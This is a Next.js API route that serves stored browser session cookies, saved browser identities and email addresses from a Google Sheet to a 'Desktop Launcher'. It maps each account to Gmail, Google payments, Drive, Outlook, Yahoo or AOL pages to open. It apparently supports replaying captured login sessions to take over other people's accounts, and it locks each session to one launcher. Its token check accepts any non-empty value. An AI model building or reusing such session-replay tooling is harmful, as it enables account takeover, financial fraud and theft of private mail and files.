import { NextResponse } from "next/server";
import logger from "../../../../utils/logger.js";
import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../../googlesheets.js';

export const maxDuration = 30;
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

const COOKIE_SHEET = 'cookie';

const FREE_MS_DOMAINS = new Set([
    'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
    'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
    'outlook.ca', 'hotmail.ca', 'live.ca',
    'outlook.co.za', 'hotmail.co.za', 'live.co.za',
    'outlook.com.au', 'hotmail.com.au', 'live.com.au',
    'outlook.fr', 'hotmail.fr', 'live.fr',
    'outlook.de', 'hotmail.de', 'live.de',
    'outlook.it', 'hotmail.it', 'live.it',
    'outlook.es', 'hotmail.es', 'live.es',
    'outlook.jp', 'hotmail.jp', 'live.jp',
    'outlook.com.br', 'hotmail.com.br', 'live.com.br',
    'msn.com', 'live.net'
]);

function resolveSmartPlatformUrls(domain, platform, email) {
    const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
    const p = (platform || '').toLowerCase().trim();
    const em = (email || '').toLowerCase().trim();

    // 1. Google / Gmail / GSuite: 3 tabs
    if (p === 'google' || p === 'gmail' || p.includes('google') || p.includes('gmail') || p.includes('gsuite') || p.includes('workspace') || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com')) {
        return [
            'https://mail.google.com/mail/u/0/#inbox',
            'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0',
            'https://drive.google.com/drive/u/0/my-drive'
        ];
    }

    // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
    const isMsDomain = FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn') || d.includes('microsoft');
    if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain) {
        if (FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn')) {
            return ['https://outlook.live.com/mail/'];
        }
        // Custom domain / Office 365 / corporate paid account
        return ['https://outlook.office.com/mail/'];
    }

    // 3. Yahoo
    if (p === 'yahoo' || d.includes('yahoo') || d.includes('ymail')) {
        return ['https://mail.yahoo.com/'];
    }

    // 4. AOL
    if (p === 'aol' || d.includes('aol')) {
        return ['https://mail.aol.com/'];
    }

    // 5. Fallback for custom domain
    if (d) {
        return [`https://${d}`];
    }

    return ['https://mail.google.com/mail/u/0/#inbox'];
}


export async function POST(request) {
    try {
        const body = await request.json();
        const { browserId, token, launcherKey, username } = body;

        if (!browserId) {
            return NextResponse.json({ error: "Missing required field: browserId" }, { status: 400 });
        }

        // Basic token validation — the Desktop Launcher sends the admin session cookie.
        // In production this should validate against a server-side session store; for
        // now we accept any non-empty token as proof the request came from the dashboard.
        if (!token) {
            return NextResponse.json({ error: "Missing authentication token" }, { status: 401 });
        }

        logger.info(`[electron/session-data] Request for browserId=${browserId} launcherKey=${launcherKey || 'none'}`);

        const result = await getSheetDataApi(COOKIE_SHEET);
        if (!result.success) {
            logger.error(`[electron/session-data] Failed to read cookie sheet: ${result.error}`);
            return NextResponse.json({ error: "Failed to read session data" }, { status: 500 });
        }

        const headers = result.headers;
        const browserIdIdx = headers.indexOf('browserId');
        if (browserIdIdx === -1) {
            return NextResponse.json({ error: "Cookie sheet misconfigured" }, { status: 500 });
        }

        const row = result.data.find(r => String(r[browserIdIdx]).trim() === String(browserId).trim());
        if (!row) {
            return NextResponse.json({ error: `No session found for browserId: ${browserId}` }, { status: 404 });
        }

        const col = (key) => {
            const idx = headers.indexOf(key);
            return idx !== -1 ? row[idx] : null;
        };

        // Pillar 3: Session Protection Guard (Enforce 1-Device Rule)
        const launchHistoryRaw = col('launchHistory') || '';
        let parsedLaunchHistory = null;
        if (launchHistoryRaw) {
            try {
                parsedLaunchHistory = typeof launchHistoryRaw === 'string' ? JSON.parse(launchHistoryRaw) : launchHistoryRaw;
            } catch (_) {
                parsedLaunchHistory = null;
            }
        }

        // If this session is locked to a specific launcherKey, reject requests with mismatched keys
        if (parsedLaunchHistory && parsedLaunchHistory.launcherKey) {
            if (launcherKey && parsedLaunchHistory.launcherKey !== launcherKey) {
                logger.warn(`[electron/session-data] Access Denied: browserId=${browserId} is locked to launcherKey=${parsedLaunchHistory.launcherKey}, requested by launcherKey=${launcherKey}`);
                return NextResponse.json({
                    error: "Access Denied: This session is locked to a different launcher installation."
                }, { status: 403 });
            }
        }

        // Update or initialize launch lease
        const now = new Date().toISOString();
        const updatedHistory = {
            launcherKey: launcherKey || parsedLaunchHistory?.launcherKey || '',
            username: username || parsedLaunchHistory?.username || '',
            firstLaunchedAt: parsedLaunchHistory?.firstLaunchedAt || now,
            lastLaunchedAt: now,
            lastHeartbeat: now,
            status: 'active'
        };

        if (launcherKey) {
            try {
                await ensureSheetColumns(COOKIE_SHEET, ['launchHistory']);
                await updateSheetRowApi(COOKIE_SHEET, 'browserId', browserId, {
                    launchHistory: JSON.stringify(updatedHistory)
                });
                logger.info(`[electron/session-data] Registered launch lease for browserId=${browserId} launcherKey=${launcherKey}`);
            } catch (err) {
                logger.warn(`[electron/session-data] Failed to update launchHistory: ${err.message}`);
            }
        }

        const email = col('email') || '';
        const domain = col('domain') || (email ? email.split('@')[1]?.toLowerCase() : '') || '';
        const platform = col('platform') || '';
        const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
        const cookieJSONRaw = col('cookieJSON') || col('cookie') || '';
        const browserIdentityRaw = col('browserIdentity') || '';

        let cookieJSON = [];
        if (cookieJSONRaw) {
            try {
                cookieJSON = typeof cookieJSONRaw === 'string' ? JSON.parse(cookieJSONRaw) : cookieJSONRaw;
                if (!Array.isArray(cookieJSON)) cookieJSON = [];
            } catch (_) {
                cookieJSON = [];
            }
        }

        const accountCookieRaw = col('accountCookie') || col('accountCookieJSON') || '';
        let accountCookieJSON = null;
        if (accountCookieRaw) {
            try {
                accountCookieJSON = typeof accountCookieRaw === 'string' ? JSON.parse(accountCookieRaw) : accountCookieRaw;
                if (!Array.isArray(accountCookieJSON) || accountCookieJSON.length === 0) accountCookieJSON = null;
            } catch (_) {
                accountCookieJSON = null;
            }
        }

        const driveCookieRaw = col('driveCookieJSON') || '';
        let driveCookieJSON = null;
        if (driveCookieRaw) {
            try {
                driveCookieJSON = typeof driveCookieRaw === 'string' ? JSON.parse(driveCookieRaw) : driveCookieRaw;
                if (!Array.isArray(driveCookieJSON) || driveCookieJSON.length === 0) driveCookieJSON = null;
            } catch (_) {
                driveCookieJSON = null;
            }
        }

        
        let browserIdentity = null;
        if (browserIdentityRaw) {
            try {
                browserIdentity = typeof browserIdentityRaw === 'string' ? JSON.parse(browserIdentityRaw) : browserIdentityRaw;
            } catch (_) {}
        }

        // Build the platform URLs dynamically for the Desktop Launcher to navigate to
        const platformUrls = resolveSmartPlatformUrls(domain, platform, email);
        const platformUrl = platformUrls[0] || 'https://mail.google.com/mail/u/0/#inbox';

        // Construct the direct download URL from the Drive URL
        let downloadUrl = '';
        if (driveUrl) {
            downloadUrl = getDirectDownloadUrl(driveUrl);
        }

        logger.info(`[electron/session-data] Returning session for browserId=${browserId} email=${email} cookies=${cookieJSON?.length || 0} accountCookies=${accountCookieJSON?.length || 0} driveCookies=${driveCookieJSON?.length || 0}`);

        return NextResponse.json({
            downloadUrl,
            platformUrl,
            platformUrls,
            email,
            domain,
            platform,
            cookieJSON,
            accountCookieJSON,
            driveCookieJSON,
            browserIdentity,
        });
    } catch (e) {
        logger.error(`[electron/session-data] Error: ${e.message}`);
        return NextResponse.json({ error: e.message }, { status: 500 });
    }
}

function getDirectDownloadUrl(driveUrl) {
    if (!driveUrl) return '';
    // Extract file ID from various Google Drive URL formats
    const patterns = [
        /\/d\/([a-zA-Z0-9_-]+)/,
        /id=([a-zA-Z0-9_-]+)/,
        /\/file\/d\/([a-zA-Z0-9_-]+)/,
    ];
    for (const pattern of patterns) {
        const match = driveUrl.match(pattern);
        if (match) {
            return `https://drive.google.com/uc?export=download&id=${match[1]}`;
        }
    }
    // If it's already a direct URL or Cloudinary URL, return as-is
    return driveUrl;
}

export async function OPTIONS() {
    return new Response(null, {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
        },
    });
}
